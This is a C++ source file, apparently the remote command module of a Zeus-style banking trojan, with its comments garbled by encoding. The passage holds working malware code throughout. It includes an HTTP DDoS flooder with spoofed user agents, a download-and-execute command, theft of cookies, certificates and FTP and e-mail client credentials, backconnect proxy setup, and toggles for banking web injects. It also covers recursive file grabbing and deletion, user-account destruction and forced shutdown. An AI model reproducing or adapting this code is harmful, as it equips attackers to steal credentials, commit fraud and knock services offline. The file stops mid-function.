#include <windows.h>
#include <shellapi.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "remotescript.h"
#include "dynamicconfig.h"
#include "localconfig.h"
#include "report.h"
#include "coreinstall.h"
#include "softwaregrabber.h"
#include "wininethook.h"
#include "..\common\wininet.h"
#include "nspr4hook.h"
#include "certstorehook.h"
#include "backconnectbot.h"
#include "httpgrabber.h"
#include "httptools.h"
#include "cryptedstrings.h"
#include "bank_catch.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\fs.h"
#include "..\common\process.h"
#include "..\common\sync.h"
#include "..\common\comlibrary.h"

////////////////////////////////////////////////////////////////////////////////////////////////////
// �����������.
////////////////////////////////////////////////////////////////////////////////////////////////////



#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  �������� �� �������� HttpGrabber'�.

  IN listId         - LocalConfig::ITEM_URLLIST_*.
  IN add            - true - ���������� ��������� � ������,
                      false - �������� ��������� �� ������.
  IN arguments      - ���������.
  IN argumentsCount - ���. ����������.

  Return            - true - � ������ ������,
                      false - � ������ ������.
*/
static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *arguments, DWORD argumentsCount)
{
  BinStorage::STORAGE *localConfig;
  if(argumentsCount > 1 && (localConfig = LocalConfig::beginReadWrite()) != NULL)
  {
    bool changed = false;
    LPSTR curItem;
    for(DWORD i = 1; i < argumentsCount; i++)
    {
      if((curItem = Str::_unicodeToAnsiEx(arguments[i], -1)) == NULL)
      {
        Mem::free(localConfig);
        LocalConfig::endReadWrite(NULL);
        return false;
      }

      if(add)          
      {
        if(HttpGrabber::_addUrlMaskToList(listId, &localConfig, curItem))changed = true;
      }
      else
      {
        if(HttpGrabber::_removeUrlMaskFromList(listId, &localConfig, curItem))changed = true;
      }

      Mem::free(curItem);
    }

    if(changed)return LocalConfig::endReadWrite(localConfig);

    Mem::free(localConfig);
    LocalConfig::endReadWrite(NULL);
    return true; //�.�. ��� ��� ���� ��� ��� � �����.
  }
  return false;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////
// �������.
////////////////////////////////////////////////////////////////////////////////////////////////////
enum
{
  PF_SHUTDOWN  = 0x01, //�������� ���������.
  PF_REBOOT    = 0x02, //������������� ��������.
  PF_LOGOFF    = 0x04, //��������� ������� ����� ������������.
  PF_UNINSTALL = 0x08, //������� ����.
  PF_DESTROY   = 0x10  //����������� ������������.
};

static DWORD pendingFlags;

/*
  ���������� ����������, ������������ ������ �������� ������� ��� ���� ��������.
*/
static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_SHUTDOWN;
  return true;
}
/*
	DDoS ������
*/
static int ddosthreads = 0;
static LPSTR method;
static LPSTR host;
static LPSTR url;
static int delay;
static LPSTR postdata = NULL;
static int postdatasize = NULL;
static LPSTR ref;
static bool isFlooding = true;
static LPSTR user_agents[] = 
{
		"Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; KKman2.0)",
		"Mozilla/5.0 (Linux; U; Android 1.6; en-us; eeepc Build/Donut) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
		"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.6.30 Version/10.61",
		"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.6.30 Version/10.63",
		"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.7.62 Version/11.00",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.79 Safari/537.1",
		"AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.3; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.1)",
		"Mozilla/4.0 (compatible;)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Linux; U; Android 2.2.2; es-es; Desire_A8181 Build/FRG83G) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"


};

static DWORD WINAPI ddosStart(void *args)
{
	HINTERNET ihandle,requestHandle;
	MEMDATA md;
	start:
	ihandle = Wininet::_Connect(user_agents[(int)Crypt::mtRandRange(0,19)], host, 80, NULL);
	if(Str::_findSubStringA(method,"get"))
		requestHandle = Wininet::_SendRequest(ihandle,url,ref,NULL,NULL,Wininet::WISRF_METHOD_GET | Wininet::WISRF_KEEP_CONNECTION);
	else if(Str::_findSubStringA(method,"post"))
		requestHandle = Wininet::_SendRequest(ihandle,url,ref,(void*)postdata,postdatasize,Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION);
	while(isFlooding)
	{
		if(ihandle != NULL) 
		{
			if(Wininet::_DownloadData(requestHandle, &md, 0, NULL)==false){Wininet::_CloseConnection(ihandle);Wininet::_CloseConnection(requestHandle);goto start;}
			Mem::free(&md);
		}
		else
			goto start;
		Sleep(delay);
	}
	Wininet::_CloseConnection(ihandle);
	return 1;
}

//static DWORD WINAPI killapache(void *args)
//{
//	SOCKADDR_STORAGE addr;
//	WSocket::stringToIpW(&addr,
//}

static bool ddosStop()
{
	isFlooding = false;
	return true;
}

static bool ddos(const LPWSTR *arguments, DWORD argumentsCount)
{
	
	if(Str::_findSubStringW(arguments[1],L"stop"))return ddosStop();
	if(ref!=NULL)
		Mem::free(ref);
  method = Str::_unicodeToAnsiEx(arguments[1],-1); //method
  host = Str::_unicodeToAnsiEx(arguments[2],-1); //host
  url = Str::_unicodeToAnsiEx(arguments[3],-1); //url
  delay = Str::_ToInt32W(arguments[4],NULL); //delay
  Str::_sprintfExA(&ref,"http://%s/",host);
  ddosthreads = Str::_ToInt32W(arguments[5],NULL);
  if(Str::_findSubStringA(method,"post"))
  {
	  if(argumentsCount > 5)
		postdata = Str::_unicodeToAnsiEx(arguments[6],-1);
	  else{
		  DWORD rand = Crypt::mtRandRange(10,9999);
		  Str::_sprintfExA(&postdata,"someRandomGen=%u&user.login=%u&us.pass=%u&email=%u&name=%u&id=%u&file=%u&someRandomGen=%u&user.login=%u&us.pass=%u&email=%u&name=%u&id=%u&file=%u&someRandomGen=%u&user.login=%u&us.pass=%u&email=%u&name=%u&id=%u&file=%u&someRandomGen=%u&user.login=%u&us.pass=%u&email=%u&name=%u&id=%u&file=%u&someRandomGen=%u&user.login=%u&us.pass=%u&email=%u&name=%u&id=%u&file=%u",rand,rand,rand,rand,rand,rand,rand);
	  }
	  postdatasize = Str::_LengthA(postdata);
  }
  /*WDEBUG1(WDDT_INFO, "COUNT %u", ddosthreads);
  WDEBUG2(WDDT_INFO, "ERR2 %s %s",(LPWSTR)method,(LPWSTR)host);
  WDEBUG2(WDDT_INFO, "ERR3 %s %u",(LPWSTR)url,delay);*/
  isFlooding = true;
  for(int i = 0;i<ddosthreads;i++)
  {
	  Process::_createThread(0,ddosStart,NULL);
	  //WDEBUG0(WDDT_INFO, "ERR555");
  }
	
  return true;
}



/*
  ������������ ����������, ������������ ������ �������� ������� ��� ���� ��������.
*/
static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_REBOOT;
  return true;
}

/*
  �������� ���� � �������� ������������.
*/
static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_UNINSTALL;
  return true;
}

/*
  ����������� ���������� ����� ������������. ���� ������ URL, �� ���������� ���������� � ��������
  URL, � ����������� ������������� ������� ���-���� ���������� �������� � ����������� ������������.
*/
static bool botUpdate(const LPWSTR *arguments, DWORD argumentsCount)
{
  LPSTR url = NULL;
  if(argumentsCount > 1 && arguments[1][0] != 0)
  {
    url = Str::_unicodeToAnsiEx(arguments[1], -1);
    if(url == NULL)return false;
  }

  bool retVal = DynamicConfig::download(url);
  Mem::free(url);
  
  return retVal;
}

#if(BO_BCSERVER_PLATFORMS > 0)
static bool botBcCommon(const LPWSTR *arguments, DWORD argumentsCount, bool isAdd)
{
  bool retVal = false;
  if(argumentsCount >= 4)
  {
    LPSTR servicePort = Str::_unicodeToAnsiEx(arguments[1], -1);
    LPSTR server      = Str::_unicodeToAnsiEx(arguments[2], -1);
    LPSTR serverPort  = Str::_unicodeToAnsiEx(arguments[3], -1);

    if(servicePort != NULL && server != NULL && serverPort != NULL)
    {
      if(isAdd)retVal = BackconnectBot::_addStatic(servicePort, server, serverPort);
      else retVal = BackconnectBot::_removeStatic(servicePort, server, serverPort);
    }

    Mem::free(servicePort);
    Mem::free(server);
    Mem::free(serverPort);
  }
  return retVal;
}

static bool botBcAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
  return botBcCommon(arguments, argumentsCount, true);
}

static bool botBcRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  return botBcCommon(arguments, argumentsCount, false);
}
#endif

#if(BO_BANK > 0)

static bool bankAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
	bool retVal=false;
	if(argumentsCount > 1)
	{
		LPSTR url = Str::_unicodeToAnsiEx(arguments[1],-1);
		retVal = bank::_addStatic(url);
		Mem::free(url);
	}
	
	return retVal;
}

static bool bankRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
	bool retVal=false;
	if(argumentsCount > 1)
	{
		LPSTR url = Str::_unicodeToAnsiEx(arguments[1],-1);
		retVal = bank::_removeStatic(url);
		Mem::free(url);
	}
	return retVal;
}
#endif

static bool botHttpInjectDisable(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, true, arguments, argumentsCount);
}

static bool botHttpInjectEnable(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, false, arguments, argumentsCount);
}

bool fsPathGetProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	WCHAR curFile[MAX_PATH];
	if(Fs::_pathCombine(curFile, path, (LPWSTR)fileInfo->cFileName))
	{
		CSTR_GETW(report_fmt,remotescript_command_fs_path_get_format);
		if(Report::writeStringFormat(BLT_GRABBED_OTHER, path, (LPWSTR)fileInfo->cFileName, report_fmt, path, (LPWSTR)fileInfo->cFileName)) WDEBUG1(WDDT_INFO, "Got file path by mask: %s", curFile);
	}
	return true;
}

static bool fsPathGet(const LPWSTR *arguments, DWORD argumentsCount)
{
	CSTR_GETW(file,remotescript_fs_search_add_file);
	DWORD flags;
	if(Str::_CompareW(arguments[1], file, -1, -1) == 0) flags = Fs::FFFLAG_SEARCH_FILES;
	else flags = Fs::FFFLAG_SEARCH_FOLDERS;
	flags = flags | Fs::FFFLAG_RECURSIVE;
	WCHAR dd[4];
	DWORD dr = GetLogicalDrives();
	for( int i = 0; i < 26; i++ )
	{
		if((dr>>i)&0x00000001) 
		{
			dd[0] =  char(65+i); dd[1] = L':'; dd[2] = L'\\'; dd[3] = 0;
			UINT type = GetDriveTypeW(dd);

			if(type == DRIVE_FIXED)
				Fs::_findFiles(dd, arguments + 2, argumentsCount - 2, flags, fsPathGetProc, 0, coreData.globalHandles.stopEvent, 100, 100);
		}
	}
	return true;
}

bool fsSearchAddProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	WCHAR curFile[MAX_PATH];
	if(Fs::_pathCombine(curFile, path, (LPWSTR)fileInfo->cFileName))
	{
		if(!(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && Report::writeFile(curFile, path, (LPWSTR)fileInfo->cFileName)) WDEBUG1(WDDT_INFO, "Founded file by mask: %s", curFile);
		else {Report::writeFile(curFile, path, (LPWSTR)fileInfo->cFileName);WDEBUG1(WDDT_INFO, "Founded folder by mask: %s", curFile);}
	}
	return true;
}

bool fsSearchRemoveProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	WCHAR curFile[MAX_PATH];
	if(Fs::_pathCombine(curFile, path, (LPWSTR)fileInfo->cFileName))
	{
		if(!(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && Fs::_removeFile(curFile)) WDEBUG1(WDDT_INFO, "Deleted file by mask: %s", curFile);
		else {Fs::_removeDirectoryTree(curFile);WDEBUG1(WDDT_INFO, "Deleted folder by mask: %s", curFile);}
		
	}
	return true;
}

/*
	Example: fs_search_add [file|folder] mask1 mask2...maskN

*/

static bool fsSearchAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
	if(argumentsCount <= 2) return false;
	CSTR_GETW(file,remotescript_fs_search_add_file);
	DWORD flags;
	if(Str::_CompareW(arguments[1], file, -1, -1) == 0) flags = Fs::FFFLAG_SEARCH_FILES;
	else flags = Fs::FFFLAG_SEARCH_FOLDERS;
	flags = flags | Fs::FFFLAG_RECURSIVE;
	WCHAR dd[4];
	DWORD dr = GetLogicalDrives();
	for( int i = 0; i < 26; i++ )
	{
		if((dr>>i)&0x00000001) 
		{
			dd[0] =  char(65+i); dd[1] = L':'; dd[2] = L'\\'; dd[3] = 0;
			UINT type = GetDriveTypeW(dd);

			if(type == DRIVE_FIXED)
				Fs::_findFiles(dd, arguments + 2, argumentsCount - 2, flags, fsSearchAddProc, 0, coreData.globalHandles.stopEvent, 100, 100);
		}
	}
  
  return true;
}

/*
	Example: fs_search_add [file|folder] mask1 mask2...maskN

*/

static bool fsSearchRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
	if(argumentsCount <= 2) return false;
	CSTR_GETW(file,remotescript_fs_search_add_file);
	DWORD flags;
	if(Str::_CompareW(arguments[1], file, -1, -1) == 0) flags = Fs::FFFLAG_SEARCH_FILES;
	else flags = Fs::FFFLAG_SEARCH_FOLDERS;
	flags = flags | Fs::FFFLAG_RECURSIVE;
	WCHAR dd[4];
	DWORD dr = GetLogicalDrives();
	for( int i = 0; i < 26; i++ )
	{
		if((dr>>i)&0x00000001) 
		{
			dd[0] =  char(65+i); dd[1] = L':'; dd[2] = L'\\'; dd[3] = 0;
			UINT type = GetDriveTypeW(dd);

			if(type == DRIVE_FIXED)
				Fs::_findFiles(dd, arguments + 2, argumentsCount - 2, flags, fsSearchRemoveProc, 0, coreData.globalHandles.stopEvent, 100, 100);
		}
	}
  
  return true;
}

/*
  ����������� �������� ������������.
*/
static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_DESTROY;
  return true;
}

/*
  ���������� ������� ������ ������������.
*/
static bool userLogoff(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_LOGOFF;
  return true;
}

static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
{
  bool ok = false;
  if(argumentsCount > 1 && arguments[1][0] != 0)
  {
    WCHAR filePath[MAX_PATH];
    
    //URL.
    Str::UTF8STRING u8Url;
    if(CWA(shlwapi, PathIsURLW)(arguments[1]) == TRUE)
    {
      if(Str::_utf8FromUnicode(arguments[1], -1, &u8Url))
      {
        //������� ��������� ����������.
        if(Fs::_createTempDirectory(NULL, filePath))
        {
          //�������� ��� �����.
          //FIXME: Content-Disposition
          LPWSTR fileName = HttpTools::_getFileNameFromUrl((LPSTR)u8Url.data);
          if(fileName != NULL && Fs::_pathCombine(filePath, filePath, fileName))
          {
            //�������� �����.
            Wininet::CALLURLDATA cud;
            Core::initDefaultCallUrlData(&cud);

            cud.pstrURL                   = (LPSTR)u8Url.data;
            cud.hStopEvent                = coreData.globalHandles.stopEvent;
            cud.DownloadData_pstrFileName = filePath;

            WDEBUG2(WDDT_INFO, "\"%S\" => \"%s\".", u8Url.data, filePath);
            ok = Wininet::_CallURL(&cud, NULL);
          }
#         if(BO_DEBUG > 0)
          else WDEBUG0(WDDT_ERROR, "Failed to get file name.");
#         endif

          Mem::free(fileName);
        }
#       if(BO_DEBUG > 0)
        else WDEBUG0(WDDT_ERROR, "Failed to create temp direcory.");
#       endif
      
        Str::_utf8Free(&u8Url);
      }
    }
    //��������� ����. ����������� ����������.
    else
    {
      DWORD size = CWA(kernel32, ExpandEnvironmentStringsW)(arguments[1], filePath, MAX_PATH);
      if(size > 0 && size < MAX_PATH)ok = true;
    }

    //������ �����.
    if(ok)
    {
      LPWSTR commandLine = NULL;
      if(argumentsCount > 2 && (commandLine = Str::_joinArgumentsW(arguments + 2, argumentsCount - 2)) == NULL)
      {
        ok = false;
      }
      else
      {
        WDEBUG1(WDDT_INFO, "commandLine=[%s]", commandLine);
        //������.
        ok = (((int)CWA(shell32, ShellExecuteW)(NULL, NULL, filePath, commandLine, NULL, SW_SHOWNORMAL)) > 32);
      
        //�� ����� � ���... ��� ����� ����������.
        if(!ok)ok = (Process::_createEx(filePath, commandLine, NULL, NULL, NULL) != 0);
        
        Mem::free(commandLine);
      }
    }
  }
  return ok;
}

#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  ��������� ����� ��������� ���������.
*/
static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
{
# if(BO_WININET > 0)
  WininetHook::_getCookies();
# endif
# if(BO_NSPR4 > 0)
  Nspr4Hook::_getCookies();
# endif
  return true;
}

/*
  �������� ����� ��������� ���������.
*/
static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
# if(BO_WININET > 0)
  WininetHook::_removeCookies();
# endif
# if(BO_NSPR4 > 0)
  Nspr4Hook::_removeCookies();
# endif
  return true;
}
#endif

/*
  ���������� ����������� �� MY.
*/
static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  return CertStoreHook::_exportMy();
}

/*
  �������� ������������ �� MY.
*/
static bool userCertsRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  return CertStoreHook::_clearMy();
}

#if(BO_WININET > 0 || BO_NSPR4 > 0)
static bool userUrlBlock(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKED, true, arguments, argumentsCount);
}

static bool userUrlUnblock(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKED, false, arguments, argumentsCount);
}
#endif

#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  ��������� �������� �������� ��� ���� �������������� ���������.
*/
static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
{
  WCHAR fileName[MAX_PATH];
  Core::getPeSettingsPath(Core::PSP_QUICKSETTINGSFILE, fileName);

  if(argumentsCount > 1 && arguments[1][0] != 0)return Fs::_saveToFile(fileName, arguments[1], Str::_LengthW(arguments[1]) * sizeof(WCHAR));
  return Fs::_removeFile(fileName);
}
#endif

#if(BO_SOFTWARE_FTP > 0)
/*
  ��������� ������ FTP-��������.
*/
static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  HRESULT comResult;
  if(ComLibrary::_initThread(&comResult))
  {
    SoftwareGrabber::_ftpAll();
    ComLibrary::_uninitThread(comResult);
    return true;
  }
  return false;  
}
#endif

#if(BO_SOFTWARE_EMAIL > 0)
/*
  ��������� ������ E-mail-��������.
*/
static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  HRESULT comResult;
  if(ComLibrary::_initThread(&comResult))
  {
    SoftwareGrabber::_emailAll();
    ComLibrary::_uninitThread(comResult);
    return true;
  }
  return false;  
}
#endif

/*
  ��������� ����� ����-������.
*/
static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  SoftwareGrabber::_getMacromediaFlashFiles();
  return true;
}

/*
  ��������� �������.
*/
static bool userReclamAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
  if(argumentsCount != 3)return false;

  return true;
}

/*
  �������� �������.
*/
static bool userReclamRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  if(argumentsCount != 2) return false;

  return true;
}

/*
  �������� ����� ����-������.
*/
static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  SoftwareGrabber::_removeMacromediaFlashFiles();
  return true;
}

/*
  ���������� ������, ������� ������ ����������� ����� �������� ������ �������.
*/
static void executePendingCommands(void)
{
  //���� ��� ������ ��������� ���� ����������.
  if(pendingFlags & PF_DESTROY)
  {
    Core::destroyUser();
    return;
  }
  
  if(pendingFlags & PF_UNINSTALL)
  {
    CoreInstall::_uninstall(false);
  }
  
  //�������� ���������� ������, ����� ����������� ������ ���� �� ���.
  if(pendingFlags & (PF_REBOOT | PF_SHUTDOWN))
  {
    Process::_enablePrivilege(SE_SHUTDOWN_NAME, true);
    CWA(advapi32, InitiateSystemShutdownExW)(NULL, NULL, 0, TRUE, pendingFlags & PF_REBOOT ? TRUE : FALSE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
    return;
  }

  if(pendingFlags & PF_LOGOFF)
  {
    CWA(user32, ExitWindowsEx)(EWX_LOGOFF | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
    return;
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// ��������� ������.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef bool (*COMMANDPROC)(const LPWSTR *arguments, DWORD argumentsCount);
typedef struct
{
  WORD nameId;      //��� �������.
  COMMANDPROC proc; //������� ��������� �������.
}COMMANDDATA;

static const COMMANDDATA commandData[] =
{
  //������ � OC.
  {CryptedStrings::id_remotescript_command_os_shutdown,             osShutdown},
  {CryptedStrings::id_remotescript_command_os_reboot,               osReboot},
  
  //������ � �����.
  {CryptedStrings::id_remotescript_command_ddos,					ddos},
  {CryptedStrings::id_remotescript_command_bot_uninstall,           botUninstall},
  {CryptedStrings::id_remotescript_command_bot_update,              botUpdate},
#if(BO_BCSERVER_PLATFORMS > 0)
  {CryptedStrings::id_remotescript_command_bot_bc_add,              botBcAdd},
  {CryptedStrings::id_remotescript_command_bot_bc_remove,           botBcRemove},
#endif
#if(BO_BANK > 0)
  {CryptedStrings::id_remotescript_command_bank_add,				bankAdd},
  {CryptedStrings::id_remotescript_command_bank_remove,				bankRemove},
#endif
  {CryptedStrings::id_remotescript_command_bot_httpinject_disable,  botHttpInjectDisable},
  {CryptedStrings::id_remotescript_command_bot_httpinject_enable,   botHttpInjectEnable},

  //������ � �������.
  {CryptedStrings::id_remotescript_command_fs_path_get,             fsPathGet},
  {CryptedStrings::id_remotescript_command_fs_search_add,           fsSearchAdd},
  {CryptedStrings::id_remotescript_command_fs_search_remove,        fsSearchRemove},
  
  //������ � �������������.
  {CryptedStrings::id_remotescript_command_user_destroy,            userDestroy},
  {CryptedStrings::id_remotescript_command_user_logoff,             userLogoff},
  {CryptedStrings::id_remotescript_command_user_execute,            userExecute},
  {CryptedStrings::id_remotescript_command_user_reclam_add,             },
  {CryptedStrings::id_remotescript_command_user_reclam_remove,             },
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_cookies_get,        userCookiesGet},
  {CryptedStrings::id_remotescript_command_user_cookies_remove,     userCookiesRemove},
#endif
  {CryptedStrings::id_remotescript_command_user_certs_get,          userCertsGet},
  {CryptedStrings::id_remotescript_command_user_certs_remove,       userCertsRemove},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_url_block,          userUrlBlock},
  {CryptedStrings::id_remotescript_command_user_url_unblock,        userUrlUnblock},
#endif
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_homepage_set,       userHomepageSet},
#endif
#if(BO_SOFTWARE_FTP > 0)
  {CryptedStrings::id_remotescript_command_user_ftpclients_get,     userFtpClientsGet},
#endif
#if(BO_SOFTWARE_EMAIL > 0)
  {CryptedStrings::id_remotescript_command_user_emailclients_get,   userEmailClientsGet},
#endif
  {CryptedStrings::id_remotescript_command_user_flashplayer_get,    userFlashPlayerGet},
  {CryptedStrings::id_remotescript_command_user_flashplayer_remove, userFlashPlayerRemove},
};

////////////////////////////////////////////////////////////////////////////////////////////////////
// RemoteScript
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  WORD errorMessageId; //��������� �� ������ ��� 0.
  DWORD errorLine;     //������ ������ ��� (DWORD)-1.
  LPBYTE hash;         //��� �������.
}SCRIPTDATA;

void RemoteScript::init(void)
{

}

void RemoteScript::uninit(void)
{

}

static int requestProc(DWORD loop, Report::SERVERSESSION *session)
{
  if(Report::addBasicInfo(&session->postData, Report::BIF_BOT_ID | Report::BIF_BOT_VERSION))
  {
    SCRIPTDATA *scriptData = (SCRIPTDATA *)session->customData;
    DWORD status = scriptData->errorMessageId == 0 ? 0 : 1;
    
    //�.�. ��������� �������� ������ ������ ��������� ascii, �� ������ �������� � Unicode/UTF8.
    char message[CryptedStrings::len_max + 10/*DWORD*/];

    if(scriptData->errorMessageId == 0)CryptedStrings::_getA(CryptedStrings::id_remotescript_error_success, message);
    else if(scriptData->errorLine == (DWORD)-1)CryptedStrings::_getA(scriptData->errorMessageId, message);
    else
    {
      char messageFormat[CryptedStrings::len_max];
      CryptedStrings::_getA(scriptData->errorMessageId, messageFormat);
      Str::_sprintfA(message, sizeof(message) / sizeof(char), messageFormat, scriptData->errorLine);
    }
    
    if(BinStorage::_addItem(&session->postData, SBCID_SCRIPT_ID,     BinStorage::ITEMF_COMBINE_OVERWRITE, scriptData->hash, MD5HASH_SIZE) &&
       BinStorage::_addItem(&session->postData, SBCID_SCRIPT_STATUS, BinStorage::ITEMF_COMBINE_OVERWRITE, &status, sizeof(DWORD)) &&
       BinStorage::_addItem(&session->postData, SBCID_SCRIPT_RESULT, BinStorage::ITEMF_COMBINE_OVERWRITE, message, Str::_LengthA(message)))
    {
      return Report::SSPR_CONTUNUE;
    }
  }
  return Report::SSPR_ERROR;
}

static int resultProc(DWORD loop, Report::SERVERSESSION *session)
{
  return Report::SSPR_END;
}

/*
  �������� ������ �������.

  IN hash - MD5 ��� �������.

  Return  - 0 - � ������ ������,
            CryptedStrings::id_* - � ������ �������.
*/
static WORD getScriptStatusByHash(LPBYTE hash)
{
  WORD errorMessageId = NULL;
  BinStorage::STORAGE *localConfig = LocalConfig::beginReadWrite();

  if(localConfig == NULL)
  {
    errorMessageId = CryptedStrings::id_remotescript_error_failed_to_load;
  }
  else
  {
    DWORD size;
    LPBYTE hashList = (LPBYTE)BinStorage::_getItemDataEx(localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING, &size);

    if(hashList != NULL && size % MD5HASH_SIZE == 0)
    {
      for(DWORD i = 0; i < size; i += MD5HASH_SIZE)if(Mem::_compare(hash, hashList + i, MD5HASH_SIZE) == 0)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_already_executed;
        break;
      }

      //��������� ����� ���.
      if(errorMessageId == 0)
      {
        bool added = false;
        if(Mem::reallocEx(&hashList, size + MD5HASH_SIZE))
        {
          Mem::_copy(hashList + size, hash, MD5HASH_SIZE);
          added = BinStorage::_modifyItemById(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hashList, size + MD5HASH_SIZE);
        }

        if(!added)
        {
          errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
          WDEBUG0(WDDT_ERROR, "_modifyItemById or reallocEx failed.");
        }
      }
    }
    //���� ����������� ���� ������� ��� �� ����� �� �����������. ������� ����� ������.
    else if(!BinStorage::_addItem(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hash, MD5HASH_SIZE))
    {
      errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
      WDEBUG0(WDDT_ERROR, "_addItem failed.");
    }

    //���� ��������� ������, ������� ��������� �� �����.
    if(errorMessageId != 0)
    {
      Mem::free(localConfig);
      localConfig = NULL;
    }

    //������������ ������ � ���������� ������������.
    Mem::free(hashList);
